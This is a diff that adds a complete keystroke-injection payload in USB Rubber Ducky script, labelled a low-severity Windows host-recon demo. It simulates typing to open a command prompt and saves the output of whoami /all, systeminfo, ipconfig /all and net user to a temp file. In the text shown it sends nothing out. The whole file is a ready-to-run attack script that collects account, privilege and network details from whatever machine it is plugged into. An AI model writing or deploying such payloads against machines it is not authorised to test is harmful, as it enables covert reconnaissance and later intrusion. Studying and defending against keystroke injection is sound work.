@@ -1,0 +1,19 @@
+REM Basic host-recon payload (Windows) -- low severity demo
+REM Opens a command prompt and writes general host information to a temp file.
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 800
+STRING whoami /all > %TEMP%\info.txt
+ENTER
+DELAY 200
+STRING systeminfo >> %TEMP%\info.txt
+ENTER
+DELAY 200
+STRING ipconfig /all >> %TEMP%\info.txt
+ENTER
+DELAY 200
+STRING net user >> %TEMP%\info.txt
+ENTER
